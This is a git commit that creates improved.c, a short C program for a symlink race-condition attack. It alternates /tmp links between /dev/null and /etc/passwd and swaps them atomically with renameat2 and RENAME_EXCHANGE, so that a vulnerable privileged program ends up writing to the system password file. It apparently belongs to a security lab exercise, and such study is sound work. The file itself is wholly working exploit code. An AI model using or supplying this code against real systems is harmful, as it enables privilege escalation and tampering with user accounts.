264fc830da74c2cfaf39e960d940fdf243983e5b
anjelikasah <38975257+anjelikasah@users.noreply.github.com>
2020-09-27 18:02:28 +0545

    Create improved.c

---
+++ improved.c
@@ -0,0 +1,11 @@
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/fs.h>
+int main()
+{
+unsigned int flags = RENAME_EXCHANGE;
+unlink("/tmp/XYZ"); symlink("/dev/null", "/tmp/XYZ");
+unlink("/tmp/ABC"); symlink("/etc/passwd", "/tmp/ABC");
+syscall(SYS_renameat2, 0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
+return 0;
+}
